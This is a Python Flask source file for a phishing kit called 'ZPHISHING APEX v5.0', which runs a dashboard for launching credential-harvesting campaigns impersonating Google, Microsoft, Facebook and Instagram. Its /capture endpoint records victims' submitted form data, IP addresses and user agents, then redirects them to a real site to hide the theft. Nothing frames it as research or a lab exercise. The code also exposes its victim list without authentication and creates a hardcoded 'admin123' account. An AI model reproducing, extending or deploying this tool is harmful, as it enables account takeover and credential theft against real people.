#!/usr/bin/env python3
"""
ZPHISHING APEX v5.0 — "LEVIATHAN"
Built by worm shadow for He
Run: python3 zphishing.py
"""

import os
import sys
import json
import time
import hashlib
import threading
from datetime import datetime

# Add core to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'core'))

from engine import ZPhishingEngine, CryptoEngine, BlockchainVerifier

# Try to import Flask
try:
    from flask import Flask, request, render_template_string, redirect, jsonify, session
    from functools import wraps
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False
    print("Flask not installed. Install with: pip install flask")

# Initialize
engine = ZPhishingEngine()

if FLASK_AVAILABLE:
    app = Flask(__name__)
    app.secret_key = os.environ.get('SECRET_KEY', os.urandom(32).hex())

    def login_required(f):
        @wraps(f)
        def decorated(*args, **kwargs):
            if 'user' not in session:
                return jsonify({'error': 'Login required'}), 401
            return f(*args, **kwargs)
        return decorated

    def admin_required(f):
        @wraps(f)
        def decorated(*args, **kwargs):
            if 'user' not in session:
                return jsonify({'error': 'Login required'}), 401
            if session.get('role') != 'admin':
                return jsonify({'error': 'Admin required'}), 403
            return f(*args, **kwargs)
        return decorated

    @app.route('/')
    def index():
        return redirect('/dashboard')

    @app.route('/dashboard')
    def dashboard():
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>ZPHISHING APEX v5.0</title>
            <style>
                body { font-family: monospace; background: #0a0a0f; color: #fff; padding: 40px; }
                h1 { color: #ff0040; text-shadow: 0 0 20px #ff0040; }
                .box { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; padding: 20px; margin: 20px 0; }
                .stat { display: inline-block; margin: 20px; padding: 20px; background: rgba(255,0,64,0.1); border-radius: 8px; }
                .stat h3 { color: #888; font-size: 12px; margin: 0; }
                .stat p { color: #ff0040; font-size: 32px; margin: 10px 0 0 0; }
                button { background: #ff0040; color: #fff; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; margin: 5px; }
                button:hover { background: #cc0033; }
                input { padding: 10px; margin: 5px; background: #1a1a2e; border: 1px solid #333; color: #fff; border-radius: 4px; }
                table { width: 100%; border-collapse: collapse; }
                th, td { padding: 12px; text-align: left; border-bottom: 1px solid #333; }
                th { color: #888; }
            </style>
        </head>
        <body>
            <h1>ZPHISHING APEX v5.0</h1>
            <p>Built by worm shadow for He</p>

            <div class="box">
                <div class="stat"><h3>Campaigns</h3><p id="total-campaigns">0</p></div>
                <div class="stat"><h3>Victims</h3><p id="total-victims">0</p></div>
                <div class="stat"><h3>Blockchain</h3><p id="block-length">0</p></div>
            </div>

            <div class="box">
                <h2>Create Campaign</h2>
                <input type="text" id="camp-name" placeholder="Campaign name">
                <select id="camp-template">
                    <option value="google">Google</option>
                    <option value="microsoft">Microsoft</option>
                    <option value="facebook">Facebook</option>
                    <option value="instagram">Instagram</option>
                </select>
                <button onclick="createCampaign()">Create</button>
            </div>

            <div class="box">
                <h2>Campaigns</h2>
                <table id="campaigns-table">
                    <tr><th>ID</th><th>Name</th><th>Template</th><th>Status</th><th>Victims</th></tr>
                </table>
            </div>

            <div class="box">
                <h2>Victims</h2>
                <table id="victims-table">
                    <tr><th>ID</th><th>Campaign</th><th>IP</th><th>Time</th></tr>
                </table>
            </div>

            <script>
                async function loadStats() {
                    const res = await fetch('/api/stats');
                    const data = await res.json();
                    document.getElementById('total-campaigns').textContent = data.total_campaigns;
                    document.getElementById('total-victims').textContent = data.total_victims;
                    document.getElementById('block-length').textContent = data.blockchain_length;
                }

                async function loadCampaigns() {
                    const res = await fetch('/api/campaigns');
                    const data = await res.json();
                    const tbody = document.getElementById('campaigns-table');
                    tbody.innerHTML = '<tr><th>ID</th><th>Name</th><th>Template</th><th>Status</th><th>Victims</th></tr>';
                    data.forEach(c => {
                        tbody.innerHTML += `<tr><td>${c.id}</td><td>${c.name}</td><td>${c.template}</td><td>${c.status}</td><td>${c.victims}</td></tr>`;
                    });
                }

                async function loadVictims() {
                    const res = await fetch('/api/victims');
                    const data = await res.json();
                    const tbody = document.getElementById('victims-table');
                    tbody.innerHTML = '<tr><th>ID</th><th>Campaign</th><th>IP</th><th>Time</th></tr>';
                    data.forEach(v => {
                        tbody.innerHTML += `<tr><td>${v.id}</td><td>${v.campaign_id}</td><td>${v.ip}</td><td>${v.timestamp}</td></tr>`;
                    });
                }

                async function createCampaign() {
                    const name = document.getElementById('camp-name').value;
                    const template = document.getElementById('camp-template').value;
                    await fetch('/api/campaigns', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({name, template})
                    });
                    loadStats();
                    loadCampaigns();
                }

                loadStats();
                loadCampaigns();
                loadVictims();
                setInterval(loadStats, 5000);
            </script>
        </body>
        </html>
        """
        return render_template_string(html)

    @app.route('/api/stats')
    def api_stats():
        return jsonify(engine.get_stats())

    @app.route('/api/campaigns', methods=['GET', 'POST'])
    def api_campaigns():
        if request.method == 'POST':
            data = request.get_json()
            campaign_id = engine.create_campaign(data['name'], data['template'])
            return jsonify({'id': campaign_id}), 201
        return jsonify(engine.list_campaigns())

    @app.route('/api/victims')
    def api_victims():
        return jsonify(engine.list_victims())

    @app.route('/api/login', methods=['POST'])
    def api_login():
        data = request.get_json()
        user = engine.authenticate(data['username'], data['password'])
        if user:
            session['user'] = user['username']
            session['role'] = user['role']
            return jsonify({'success': True, 'api_key': user['api_key']})
        return jsonify({'error': 'Invalid credentials'}), 401

    @app.route('/campaign/<campaign_id>')
    def campaign_page(campaign_id):
        html = engine.get_campaign_html(campaign_id)
        if html:
            return render_template_string(html)
        return "Campaign not found", 404

    @app.route('/capture', methods=['POST'])
    def capture():
        campaign_id = request.args.get('c', '')
        data = request.form.to_dict()
        request_info = {
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', 'unknown')
        }
        victim_id = engine.capture(campaign_id, data, request_info)
        return redirect(engine.campaigns.get(campaign_id, {}).get('redirect_url', 'https://www.google.com'))

    def run_server(host='127.0.0.1', port=8080):
        print("=" * 60)
        print("ZPHISHING APEX v5.0 - LEVIATHAN")
        print("Built by worm shadow for He")
        print("=" * 60)
        print(f"Starting server on {host}:{port}")
        print(f"Dashboard: http://{host}:{port}/dashboard")
        print("=" * 60)
        app.run(host=host, port=port, debug=False)

    if __name__ == '__main__':
        run_server()
else:
    # CLI mode when Flask not available
    print("ZPHISHING APEX v5.0 - CLI Mode")
    print("Install Flask for web interface: pip install flask")

    # Create admin
    result = engine.create_user('admin', 'admin123', 'admin')
    print(f"Admin created: {result['user_id']}")
    print(f"API Key: {result['api_key']}")

    # Create test campaign
    camp_id = engine.create_campaign('Test Campaign', 'google')
    print(f"Test campaign: {camp_id}")

    # Simulate capture
    victim_id = engine.capture(camp_id, 
        {'email': 'test@gmail.com', 'password': 'test123'},
        {'ip': '192.168.1.100', 'user_agent': 'Mozilla/5.0'})
    print(f"Test victim: {victim_id}")

    # Show stats
    stats = engine.get_stats()
    print(f"\nStats: {json.dumps(stats, indent=2)}")
